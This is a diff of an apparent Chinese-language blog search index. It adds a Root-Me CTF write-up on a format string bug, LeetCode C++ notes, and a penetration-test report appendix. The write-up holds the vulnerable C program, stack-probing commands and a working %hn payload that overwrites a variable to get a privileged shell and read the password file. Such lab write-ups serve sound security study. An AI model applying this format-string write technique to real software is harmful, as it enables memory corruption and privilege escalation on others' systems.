@@ -494,6 +494,145 @@ Usage: strings [option(s)] [file(s)]
       </tags>
   </entry>
   <entry>
+    <title>Format string bug basic 2</title>
+    <url>/2020/11/29/Format_string_bug_basic_2/</url>
+    <content><![CDATA[<h2 id="ELF-x86-Format-string-bug-basic-2"><a href="#ELF-x86-Format-string-bug-basic-2" class="headerlink" title="ELF x86 - Format string bug basic 2"></a>ELF x86 - Format string bug basic 2</h2><hr>
+<h3 id="snprintf"><a href="#snprintf" class="headerlink" title="snprintf"></a>snprintf</h3><p><code>snprintf</code>— prints into a <code>string</code> with length checking<br>(<a href="https://pubs.opengroup.org/onlinepubs/009695399/functions/snprintf.html">https://pubs.opengroup.org/onlinepubs/009695399/functions/snprintf.html</a>)<br>snprintf（）函数应与sprintf（）等效，并增加了n参数，该参数指出s所指缓冲区的大小。<br>·如果n为零，则不写任何内容，而s可以为空指针。<br>·否则，将丢弃第n-1st之后的输出字节，而不是将其写入数组，并且在实际写入数组的字节的末尾写入一个空字节。<br><em>也就是增加了限制</em></p>
+<a id="more"></a>
+<hr>
+<h3 id="format"><a href="#format" class="headerlink" title="format"></a>format</h3><p><code>format</code>是一个字符串，以其初始移位状态（如果有）开始和结束。<br>format由零个或多个<code>指令</code>组成：<code>普通字符</code>（简单地<code>复制到输出流</code>中）和<code>转换规范</code>，每个转换规范都将导致获取零个或多个<code>参数</code>。<br>·如果format的参数不足，则结果不确定</p>
+<hr>
+<h3 id="％n"><a href="#％n" class="headerlink" title="％n $"></a>％n $</h3><p>·可以将<code>转换</code>应用于参数列表中格式之后的第n个参数，而不是下一个未使用的参数。<br>·在这种情况下，转换说明符字符％（请参见下文）由序列“％n $”代替，其中n是[1，{NL_ARGMAX}]范围内的十进制整数，给出了参数在参数中的位置。</p>
+<hr>
+<p>For example, <code>printf(&quot;%2$x&quot;, 1, 2, 3)</code> will print<code> 2</code>. In general, we can do <code>printf(&quot;%&lt;some number&gt;$x&quot;)</code> to select an arbitrary argument to printf.</p>
+<hr>
+<h3 id="n"><a href="#n" class="headerlink" title="%n"></a>%n</h3><p>n  参数应该是一个指向整数的指针，到目前为止，通过对fprintf（）函数之一的调用，将写入输出的<code>字节数</code></p>
+<hr>
+<p>The <code>number of characters written so far</code> is stored into the integer indicated by the int * (or variant) pointer argument. No argument is converted.</p>
+<hr>
+<h3 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( <span class="keyword">int</span> argc, <span class="keyword">char</span> ** argv )</span></span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">int</span> var;</span><br><span class="line">        <span class="keyword">int</span> check  = <span class="number">0x04030201</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">char</span> fmt[<span class="number">128</span>];</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (argc &lt;<span class="number">2</span>)</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">memset</span>( fmt, <span class="number">0</span>, <span class="keyword">sizeof</span>(fmt) );</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">printf</span>( <span class="string">&quot;check at 0x%x\n&quot;</span>, &amp;check );</span><br><span class="line">        <span class="built_in">printf</span>( <span class="string">&quot;argv[1] = [%s]\n&quot;</span>, argv[<span class="number">1</span>] );</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">snprintf</span>( fmt, <span class="keyword">sizeof</span>(fmt), argv[<span class="number">1</span>] );</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> ((check != <span class="number">0x04030201</span>) &amp;&amp; (check != <span class="number">0xdeadbeef</span>))    </span><br><span class="line">                <span class="built_in">printf</span> (<span class="string">&quot;\nYou are on the right way !\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">printf</span>( <span class="string">&quot;fmt=[%s]\n&quot;</span>, fmt );</span><br><span class="line">        <span class="built_in">printf</span>( <span class="string">&quot;check=0x%x\n&quot;</span>, check );</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (check==<span class="number">0xdeadbeef</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Yeah dude ! You win !\n&quot;</span>);</span><br><span class="line">                setreuid(geteuid(), geteuid());</span><br><span class="line">                system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">Download</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="try"><a href="#try" class="headerlink" title="try"></a>try</h3><pre><code>app-systeme-ch14@challenge02:~$ (for i in `seq 1 10`; do ./ch14 &quot;%$i&quot;&#39;$08x&#39;; ech
+o;done)
+check at 0xbffffae8
+argv[1] = [%1$08x]
+fmt=[080485f1]
+check=0x4030201
+
+check at 0xbffffae8
+argv[1] = [%2$08x]
+fmt=[00000000]
+check=0x4030201
+
+check at 0xbffffae8
+argv[1] = [%3$08x]
+fmt=[00000000]
+check=0x4030201
+
+check at 0xbffffae8
+argv[1] = [%4$08x]
+fmt=[000000c2]
+check=0x4030201
+
+check at 0xbffffae8
+argv[1] = [%5$08x]
+fmt=[bffffc34]
+check=0x4030201
+
+check at 0xbffffae8
+argv[1] = [%6$08x]
+fmt=[b7fe1439]
+check=0x4030201
+
+check at 0xbffffae8
+argv[1] = [%7$08x]
+fmt=[f63d4e2e]
+check=0x4030201
+
+check at 0xbffffae8
+argv[1] = [%8$08x]
+fmt=[04030201]
+check=0x4030201
+
+check at 0xbffffae8
+argv[1] = [%9$08x]
+fmt=[00000000]
+check=0x4030201
+
+check at 0xbffffae8
+argv[1] = [%10$08x]
+fmt=[00000000]
+check=0x4030201</code></pre>
+<p>第<code>8</code>处存着<code>check</code></p>
+<hr>
+<pre><code>(for i in `seq 1 12`; do ./format_2 &quot;AAAA%$i&quot;&#39;$08x&#39;;echo;done)
+
+
+check at 0xbffffae8
+argv[1] = [AAAA%8$08x]
+fmt=[AAAA04030201]
+check=0x4030201
+
+check at 0xbffffae8
+argv[1] = [AAAA%9$08x]
+fmt=[AAAA41414141]
+check=0x4030201
+
+check at 0xbffffae8
+argv[1] = [ABCD%8$08x]
+fmt=[ABCD04030201]
+check=0x4030201
+
+check at 0xbffffae8
+argv[1] = [ABCD%9$08x]
+fmt=[ABCD44434241]
+check=0x4030201</code></pre>
+<p>输入值在第九处(小端序)<br>check 在第八处</p>
+<hr>
+<h3 id="hn"><a href="#hn" class="headerlink" title="%hn"></a>%hn</h3><p>use <code>%hn</code> to write only 2 bytes at a time.</p>
+<pre><code>%n          一次性写入 4 个字节
+
+%hn         一次性写入 2 个字节
+
+%hhn        一次性写入 1 个字节</code></pre>
+<p>./a.out “$(python -c ‘import sys; sys.stdout.write(“CAAAAAAA<code>%2044x%10$hn</code>%38912x%11$hn”)’)”<br><a href="https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html">https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html</a></p>
+<p><del>printf (“\x10\x01\x48\x08_%08x.%08x.%08x.%08x.%08x|%s|”);</del></p>
+<p><del>./format_2 $(python2 -c ‘print “\xd8\xfa\xff\xbf%9$08s”‘)</del></p>
+<hr>
+<h3 id="final"><a href="#final" class="headerlink" title="final"></a>final</h3><pre><code>app-systeme-ch14@challenge02:~$ ./ch14 &quot;$(python -c &#39;print &quot;\xd8\xfa\xff\xbf%9$x
+&quot;&#39;)&quot;
+check at 0xbffffae8
+argv[1] = [Øúÿ¿%9$x]
+fmt=[Øúÿ¿bffffad8]
+check=0x4030201
+
+app-systeme-ch14@challenge02:~$ ./ch14 &quot;$(python -c &#39;print &quot;\xd8\xfa\xff\xbf%9$s
+&quot;&#39;)&quot;
+check at 0xbffffae8
+argv[1] = [Øúÿ¿%9$s]
+fmt=[Øúÿ¿Â]
+check=0x4030201</code></pre>
+<hr>
+<p>\xdead=57005<br>\xbeef=48879<br>\xdead-\xbeef=8126<br>第九处写\xbeef 48879-8<br>第十处写\xdead 8126(已经输出了48879)</p>
+<pre><code>app-systeme-ch14@challenge02:~$ ./ch14 $(python -c &#39;print &quot;\xc8\xfa\xff\xbf\xca\
+xfa\xff\xbf%48871x%9$hn&quot;+&quot;%8126x%10$hn&quot;&#39;)
+check at 0xbffffac8
+argv[1] = [Èúÿ¿Êúÿ¿%48871x%9$hn%8126x%10$hn]
+fmt=[Èúÿ¿Êúÿ¿
+                                                    ]
+check=0xdeadbeef
+Yeah dude ! You win !
+app-systeme-ch14-cracked@challenge02:~$ cat .passwd</code></pre>
+]]></content>
+      <categories>
+        <category>APP system in root_me</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Medical Image WatermarkingTechniques and Applications&gt;&gt;笔记1</title>
     <url>/2020/01/21/Medical%20Image%20WatermarkingTechniques%20and%20Applications)%25)%25%E7%AC%94%E8%AE%B01/</url>
     <content><![CDATA[<ol>
@@ -1349,6 +1488,51 @@ int.from_bytes(bytearray(new_xor), byteorder=&quot;big&quot;)将序列直接变�
       </categories>
       <tags>
         <tag>RCE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>leetcode 1 two sum</title>
+    <url>/2020/11/26/leetcode-1-two-sum/</url>
+    <content><![CDATA[<p>leetcode 1 two sum</p>
+<h3 id="学到的东西"><a href="#学到的东西" class="headerlink" title="学到的东西"></a>学到的东西</h3><h4 id="hash-table-哈希表"><a href="#hash-table-哈希表" class="headerlink" title="hash-table 哈希表"></a>hash-table 哈希表</h4><p>散列表<br>是根据键（Key）而直接访问在内存储存位置的数据结构</p>
+<p>若关键字为k，则其值存放在f(k)的存储位置上。由此，不需比较便可直接取得所查记录。称这个对应关系f为散列函数，按这个思想建立的表为散列表。</p>
+<a id="more"></a>
+<p>例如知道值为3 ， 可以直接知道地址为2<br>地址index=H（key）</p>
+<hr>
+<h4 id="c-模板"><a href="#c-模板" class="headerlink" title="c++模板"></a>c++模板</h4><h4 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h4><p>向量（Vector）是一个封装了动态大小数组的顺序容器（Sequence Container）。</p>
+<p>可以简单的认为，向量是一个能够存放任意类型的动态数组。</p>
+<h4 id="unordered-map"><a href="#unordered-map" class="headerlink" title="unordered_map"></a>unordered_map</h4><p><a href="https://blog.csdn.net/qq_21997625/article/details/84672775">https://blog.csdn.net/qq_21997625/article/details/84672775</a></p>
+<p><code>mymap.insert(make_pair(nums[i],i));</code><br>小技巧</p>
+<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><p><a href="https://github.com/Finsenty54/my_leetcode_cplusplus/blob/main/two_num_hash_map.cpp">https://github.com/Finsenty54/my_leetcode_cplusplus/blob/main/two_num_hash_map.cpp</a></p>
+]]></content>
+      <categories>
+        <category>leetcode</category>
+      </categories>
+      <tags>
+        <tag>c++</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>leetcode add two numbers</title>
+    <url>/2020/11/29/leetcode-add-two-numbers/</url>
+    <content><![CDATA[<h2 id="leetcode-add-two-numbers"><a href="#leetcode-add-two-numbers" class="headerlink" title="leetcode add two numbers"></a>leetcode add two numbers</h2><p>本题关于singly-linked list 单链表<br>链表是怎么链接在一起的？？怎么存储的？？</p>
+<a id="more"></a>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">ListNode *<span class="title">Solution::addTwoNumbers</span><span class="params">(ListNode *l1, ListNode *l2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ListNode *answer = <span class="literal">nullptr</span>;</span><br><span class="line">    ListNode **curr = &amp;answer; <span class="comment">//指向指针的指针,一种间接寻址方式</span></span><br><span class="line">                               <span class="comment">//将answer的地址赋给curr,（64位）</span></span><br><span class="line">    ListNode *addr1 = l1;</span><br><span class="line">    ListNode *addr2 = l2;</span><br><span class="line">    <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (addr1 != <span class="literal">nullptr</span> || addr2 != <span class="literal">nullptr</span> ||carry&gt;<span class="number">0</span>) <span class="comment">//do not use for()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (addr1!=<span class="literal">nullptr</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sum+=addr1-&gt;val;</span><br><span class="line">            addr1=addr1-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (addr2!=<span class="literal">nullptr</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sum+=addr2-&gt;val;</span><br><span class="line">            addr2=addr2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        sum+=carry;</span><br><span class="line">        carry = sum / <span class="number">10</span>;</span><br><span class="line">        (*curr) = <span class="keyword">new</span> ListNode(sum % <span class="number">10</span>); <span class="comment">//每次新建一个node,不用取名</span></span><br><span class="line">        <span class="comment">//*curr 取得是curr地址中的64位内容，**curr 就要取两次地址中的内容</span></span><br><span class="line">        <span class="comment">//这是变量，这是把新建node的地址赋给answer,填满64位</span></span><br><span class="line">        <span class="comment">//https://www.runoob.com/cplusplus/cpp-pointer-to-pointer.html</span></span><br><span class="line">        curr = &amp;((*curr)-&gt;next); <span class="comment">//把next本身的地址赋给curr</span></span><br><span class="line">        <span class="comment">//-&gt; 相当于 *，跳转 取内容</span></span><br><span class="line">        sum=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> answer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>解决方法：每次新建一个，匿名新建</p>
+<hr>
+<pre><code>ListNode *curr = nullptr; //指向指针的指针,一种间接寻址方式
+ListNode *answer = curr;</code></pre>
+<p>这样赋值后，answer得到是nullptr</p>
+<pre><code>ListNode *answer = nullptr;
+ListNode **curr = &amp;answer; //指向指针的指针,一种间接寻址方式</code></pre>
+<p>这样赋值后，curr得到是answer本身的地址，而不是内容</p>
+]]></content>
+      <categories>
+        <category>leetcode</category>
+      </categories>
+      <tags>
+        <tag>c++</tag>
       </tags>
   </entry>
   <entry>
@@ -2957,7 +3141,7 @@ dmm   List modules of target process
 <h3 id="补丁管理"><a href="#补丁管理" class="headerlink" title="补丁管理"></a>补丁管理</h3><p>级别：高<br>描述：MegaCorp One内外部环境中有许多未打补丁的系统和程序。<br>影响：弱授权机制和未打补丁的主机，都包含可以用爆破的漏洞，这会使得攻击者以未授权的方式得到大量的公司资产。特别地，例如SQLiite Manager包含远程执行代码的漏洞，底层主机也有一个本地提权的漏洞，这些可以使对外开放的主机轻易地被攻陷。表明了补丁管理策略以及强制执行的不足。<br>修复：所有的公司资产都要及时打上供应商提供的补丁。要完成这些可以使用供应商官方工具或者第三方程序，这些都能检查出未应用的补丁。在许多例子中，第三方工具也可以用来在一个混乱的环境中进行补丁部署。</p>
 <h3 id="DNS区域传送"><a href="#DNS区域传送" class="headerlink" title="DNS区域传送"></a>DNS区域传送</h3><p>级别：低<br>描述：一个错误配置的DNS服务器允许无限制的区域传送。<br>影响：一个配置成可与任何DNS服务器传输数据的DNS服务器，会泄露关于公司资产和网络布局等敏感信息。<br>修复：DNS区域传送需仅对已证明的服务器开放。</p>
 <h3 id="默认APACHE文件目录"><a href="#默认APACHE文件目录" class="headerlink" title="默认APACHE文件目录"></a>默认APACHE文件目录</h3><p>级别：低<br>描述：在admin.megacorpone.com主机上发现了默认的Apache文件目录。<br>影响：攻击者通过检查默认文件夹可能猜出Apache服务器的版本。敏感信息也可能泄露。<br>修复：移除公开网站的所有默认文件。</p>
-<h2 id="附录B-关于Offensive-Security"><a href="#附录B-关于Offensive-Security" class="headerlink" title="附录B:关于Offensive Security"></a>附录B:关于Offensive Security</h2><p>Offensive Security提倡黑盒渗透测试而反对白盒渗透测试。白盒渗透测试近几年来很火，因为在仅要实现常规需求的地方，简化了评估方法。其作为漏洞扫描方法，会有选择的确认发现的问题。这让服务供应商有能力扩大工作量，因为使用了自动化的工具，并且通过证书维持产品间的联动。<br>黑盒是在受控环境下的攻击模拟形式，非常接近现实环境，组织会时不时的面临攻击。黑盒测试是基于目标的评估方法，不仅仅是发现一个简单的漏洞，而是提供一个漏洞真正的商业影响。黑盒测试会找到那些修复后能带来最高商业回报的区域。<br>黑盒测试通常需要很高的专业知识。正如报告中显示的那样，Offensive Security坚信当进行黑盒测试时输出正确有效的结果是检验合格的唯一方式，因为我们专业的安全团队运用了很高专业知识。Offensive Security会集中力量进行渗透测试或着其他参与的项目。这意味着无论什么都参与到提供服务中，例如标准工具Kali Linux，畅销书的作者，O-day漏洞的发现者，或是如Exploit-DB的维护者。<br>Offensive Security提供的产品与市场需求不配对。然而，我们不会适合任一工作。Offensive Security特别提供咨询服务，底容量和高质量的比例使得员工能更接近的模拟现实世界的攻击。这也允许在保持成本合理的同时，客户可以更多地获得行业认可的专业知识。例如，大批量/快速周转服务通常不适合我们。Offensive Security专注与领导高质量，高影响的评估活动，积极地寻求其他供应商无法提供服务的客户。<br>请通过<a href="mailto:&#x69;&#110;&#x66;&#111;&#x40;&#x6f;&#x66;&#102;&#115;&#x65;&#99;&#46;&#99;&#x6f;&#x6d;">&#x69;&#110;&#x66;&#111;&#x40;&#x6f;&#x66;&#102;&#115;&#x65;&#99;&#46;&#99;&#x6f;&#x6d;</a>联系我们。</p>
+<h2 id="附录B-关于Offensive-Security"><a href="#附录B-关于Offensive-Security" class="headerlink" title="附录B:关于Offensive Security"></a>附录B:关于Offensive Security</h2><p>Offensive Security提倡黑盒渗透测试而反对白盒渗透测试。白盒渗透测试近几年来很火，因为在仅要实现常规需求的地方，简化了评估方法。其作为漏洞扫描方法，会有选择的确认发现的问题。这让服务供应商有能力扩大工作量，因为使用了自动化的工具，并且通过证书维持产品间的联动。<br>黑盒是在受控环境下的攻击模拟形式，非常接近现实环境，组织会时不时的面临攻击。黑盒测试是基于目标的评估方法，不仅仅是发现一个简单的漏洞，而是提供一个漏洞真正的商业影响。黑盒测试会找到那些修复后能带来最高商业回报的区域。<br>黑盒测试通常需要很高的专业知识。正如报告中显示的那样，Offensive Security坚信当进行黑盒测试时输出正确有效的结果是检验合格的唯一方式，因为我们专业的安全团队运用了很高专业知识。Offensive Security会集中力量进行渗透测试或着其他参与的项目。这意味着无论什么都参与到提供服务中，例如标准工具Kali Linux，畅销书的作者，O-day漏洞的发现者，或是如Exploit-DB的维护者。<br>Offensive Security提供的产品与市场需求不配对。然而，我们不会适合任一工作。Offensive Security特别提供咨询服务，底容量和高质量的比例使得员工能更接近的模拟现实世界的攻击。这也允许在保持成本合理的同时，客户可以更多地获得行业认可的专业知识。例如，大批量/快速周转服务通常不适合我们。Offensive Security专注与领导高质量，高影响的评估活动，积极地寻求其他供应商无法提供服务的客户。<br>请通过<a href="mailto:&#105;&#110;&#102;&#x6f;&#64;&#x6f;&#102;&#x66;&#115;&#101;&#x63;&#x2e;&#x63;&#x6f;&#x6d;">&#105;&#110;&#102;&#x6f;&#64;&#x6f;&#102;&#x66;&#115;&#101;&#x63;&#x2e;&#x63;&#x6f;&#x6d;</a>联系我们。</p>
 ]]></content>
       <tags>
         <tag>penetation test</tag>
@@ -3368,190 +3552,6 @@ else
 ]]></content>
       <tags>
         <tag>ios</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>leetcode 1 two sum</title>
-    <url>/2020/11/26/leetcode-1-two-sum/</url>
-    <content><![CDATA[<p>leetcode 1 two sum</p>
-<h3 id="学到的东西"><a href="#学到的东西" class="headerlink" title="学到的东西"></a>学到的东西</h3><h4 id="hash-table-哈希表"><a href="#hash-table-哈希表" class="headerlink" title="hash-table 哈希表"></a>hash-table 哈希表</h4><p>散列表<br>是根据键（Key）而直接访问在内存储存位置的数据结构</p>
-<p>若关键字为k，则其值存放在f(k)的存储位置上。由此，不需比较便可直接取得所查记录。称这个对应关系f为散列函数，按这个思想建立的表为散列表。</p>
-<a id="more"></a>
-<p>例如知道值为3 ， 可以直接知道地址为2<br>地址index=H（key）</p>
-<hr>
-<h4 id="c-模板"><a href="#c-模板" class="headerlink" title="c++模板"></a>c++模板</h4><h4 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h4><p>向量（Vector）是一个封装了动态大小数组的顺序容器（Sequence Container）。</p>
-<p>可以简单的认为，向量是一个能够存放任意类型的动态数组。</p>
-<h4 id="unordered-map"><a href="#unordered-map" class="headerlink" title="unordered_map"></a>unordered_map</h4><p><a href="https://blog.csdn.net/qq_21997625/article/details/84672775">https://blog.csdn.net/qq_21997625/article/details/84672775</a></p>
-<p><code>mymap.insert(make_pair(nums[i],i));</code><br>小技巧</p>
-<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><p><a href="https://github.com/Finsenty54/my_leetcode_cplusplus/blob/main/two_num_hash_map.cpp">https://github.com/Finsenty54/my_leetcode_cplusplus/blob/main/two_num_hash_map.cpp</a></p>
-]]></content>
-      <categories>
-        <category>leetcode</category>
-      </categories>
-      <tags>
-        <tag>c++</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>leetcode add two numbers</title>
-    <url>/2020/11/29/leetcode-add-two-numbers/</url>
-    <content><![CDATA[<h2 id="leetcode-add-two-numbers"><a href="#leetcode-add-two-numbers" class="headerlink" title="leetcode add two numbers"></a>leetcode add two numbers</h2><p>本题关于singly-linked list 单链表<br>链表是怎么链接在一起的？？怎么存储的？？</p>
-<a id="more"></a>
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">ListNode *<span class="title">Solution::addTwoNumbers</span><span class="params">(ListNode *l1, ListNode *l2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ListNode *answer = <span class="literal">nullptr</span>;</span><br><span class="line">    ListNode **curr = &amp;answer; <span class="comment">//指向指针的指针,一种间接寻址方式</span></span><br><span class="line">                               <span class="comment">//将answer的地址赋给curr,（64位）</span></span><br><span class="line">    ListNode *addr1 = l1;</span><br><span class="line">    ListNode *addr2 = l2;</span><br><span class="line">    <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (addr1 != <span class="literal">nullptr</span> || addr2 != <span class="literal">nullptr</span> ||carry&gt;<span class="number">0</span>) <span class="comment">//do not use for()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (addr1!=<span class="literal">nullptr</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sum+=addr1-&gt;val;</span><br><span class="line">            addr1=addr1-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (addr2!=<span class="literal">nullptr</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sum+=addr2-&gt;val;</span><br><span class="line">            addr2=addr2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        sum+=carry;</span><br><span class="line">        carry = sum / <span class="number">10</span>;</span><br><span class="line">        (*curr) = <span class="keyword">new</span> ListNode(sum % <span class="number">10</span>); <span class="comment">//每次新建一个node,不用取名</span></span><br><span class="line">        <span class="comment">//*curr 取得是curr地址中的64位内容，**curr 就要取两次地址中的内容</span></span><br><span class="line">        <span class="comment">//这是变量，这是把新建node的地址赋给answer,填满64位</span></span><br><span class="line">        <span class="comment">//https://www.runoob.com/cplusplus/cpp-pointer-to-pointer.html</span></span><br><span class="line">        curr = &amp;((*curr)-&gt;next); <span class="comment">//把next本身的地址赋给curr</span></span><br><span class="line">        <span class="comment">//-&gt; 相当于 *，跳转 取内容</span></span><br><span class="line">        sum=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> answer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>解决方法：每次新建一个，匿名新建</p>
-<hr>
-<pre><code>ListNode *curr = nullptr; //指向指针的指针,一种间接寻址方式
-ListNode *answer = curr;</code></pre>
-<p>这样赋值后，answer得到是nullptr</p>
-<pre><code>ListNode *answer = nullptr;
-ListNode **curr = &amp;answer; //指向指针的指针,一种间接寻址方式</code></pre>
-<p>这样赋值后，curr得到是answer本身的地址，而不是内容</p>
-]]></content>
-      <categories>
-        <category>leetcode</category>
-      </categories>
-      <tags>
-        <tag>c++</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Format string bug basic 2</title>
-    <url>/2020/11/29/Format_string_bug_basic_2/</url>
-    <content><![CDATA[<h2 id="ELF-x86-Format-string-bug-basic-2"><a href="#ELF-x86-Format-string-bug-basic-2" class="headerlink" title="ELF x86 - Format string bug basic 2"></a>ELF x86 - Format string bug basic 2</h2><hr>
-<h3 id="snprintf"><a href="#snprintf" class="headerlink" title="snprintf"></a>snprintf</h3><p><code>snprintf</code>— prints into a <code>string</code> with length checking<br>(<a href="https://pubs.opengroup.org/onlinepubs/009695399/functions/snprintf.html">https://pubs.opengroup.org/onlinepubs/009695399/functions/snprintf.html</a>)<br>snprintf（）函数应与sprintf（）等效，并增加了n参数，该参数指出s所指缓冲区的大小。<br>·如果n为零，则不写任何内容，而s可以为空指针。<br>·否则，将丢弃第n-1st之后的输出字节，而不是将其写入数组，并且在实际写入数组的字节的末尾写入一个空字节。<br><em>也就是增加了限制</em></p>
-<a id="more"></a>
-<hr>
-<h3 id="format"><a href="#format" class="headerlink" title="format"></a>format</h3><p><code>format</code>是一个字符串，以其初始移位状态（如果有）开始和结束。<br>format由零个或多个<code>指令</code>组成：<code>普通字符</code>（简单地<code>复制到输出流</code>中）和<code>转换规范</code>，每个转换规范都将导致获取零个或多个<code>参数</code>。<br>·如果format的参数不足，则结果不确定</p>
-<hr>
-<h3 id="％n"><a href="#％n" class="headerlink" title="％n $"></a>％n $</h3><p>·可以将<code>转换</code>应用于参数列表中格式之后的第n个参数，而不是下一个未使用的参数。<br>·在这种情况下，转换说明符字符％（请参见下文）由序列“％n $”代替，其中n是[1，{NL_ARGMAX}]范围内的十进制整数，给出了参数在参数中的位置。</p>
-<hr>
-<p>For example, <code>printf(&quot;%2$x&quot;, 1, 2, 3)</code> will print<code> 2</code>. In general, we can do <code>printf(&quot;%&lt;some number&gt;$x&quot;)</code> to select an arbitrary argument to printf.</p>
-<hr>
-<h3 id="n"><a href="#n" class="headerlink" title="%n"></a>%n</h3><p>n  参数应该是一个指向整数的指针，到目前为止，通过对fprintf（）函数之一的调用，将写入输出的<code>字节数</code></p>
-<hr>
-<p>The <code>number of characters written so far</code> is stored into the integer indicated by the int * (or variant) pointer argument. No argument is converted.</p>
-<hr>
-<h3 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( <span class="keyword">int</span> argc, <span class="keyword">char</span> ** argv )</span></span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">int</span> var;</span><br><span class="line">        <span class="keyword">int</span> check  = <span class="number">0x04030201</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">char</span> fmt[<span class="number">128</span>];</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (argc &lt;<span class="number">2</span>)</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">memset</span>( fmt, <span class="number">0</span>, <span class="keyword">sizeof</span>(fmt) );</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">printf</span>( <span class="string">&quot;check at 0x%x\n&quot;</span>, &amp;check );</span><br><span class="line">        <span class="built_in">printf</span>( <span class="string">&quot;argv[1] = [%s]\n&quot;</span>, argv[<span class="number">1</span>] );</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">snprintf</span>( fmt, <span class="keyword">sizeof</span>(fmt), argv[<span class="number">1</span>] );</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> ((check != <span class="number">0x04030201</span>) &amp;&amp; (check != <span class="number">0xdeadbeef</span>))    </span><br><span class="line">                <span class="built_in">printf</span> (<span class="string">&quot;\nYou are on the right way !\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">printf</span>( <span class="string">&quot;fmt=[%s]\n&quot;</span>, fmt );</span><br><span class="line">        <span class="built_in">printf</span>( <span 